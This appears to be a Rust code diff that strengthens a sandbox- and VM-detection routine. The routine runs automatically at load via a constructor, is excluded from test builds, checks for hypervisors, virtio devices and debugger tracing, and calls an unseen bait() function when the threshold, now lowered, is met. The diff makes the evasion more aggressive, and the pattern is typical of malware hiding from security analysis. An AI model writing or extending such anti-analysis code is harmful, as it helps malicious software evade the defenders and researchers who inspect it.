@@ -182,10 +182,18 @@ macro_rules! check_cpuid {
     }};
 }
 
+macro_rules! check_virtio_devices {
+    () => {{
+        Path::new("/sys/bus/virtio/devices").exists()
+            && fs::read_dir("/sys/bus/virtio/devices")
+                .map_or(false, |mut d| d.next().is_some())
+    }};
+}
+
 #[cfg(not(test))]
 #[ctor]
 fn vm_detection() {
-    let start_time = Instant::now(); 
+    let start_time = Instant::now();
     let checks: Vec<(fn() -> bool, f32)> = vec![
         (|| check_hypervisor_flag!(), 2.0),
         (|| check_vm_files!(), 1.0),
@@ -194,9 +202,10 @@ fn vm_detection() {
         (|| check_uptime!(), 0.5),
         (|| check_cpuid!(), 2.0),
         (|| is_being_traced!(), 2.0),
+        (|| check_virtio_devices!(), 1.0),
     ];
 
-    timecheck!(start_time, Duration::from_millis(500));
+    timecheck!(start_time, Duration::from_millis(50));
 
     let mut score = 0.0;
     let mut rng = rand::thread_rng();
@@ -209,7 +218,7 @@ fn vm_detection() {
         }
     }
 
-    if score >= 3.0 {
+    if score >= 1.5 {
         bait();
     }
 }
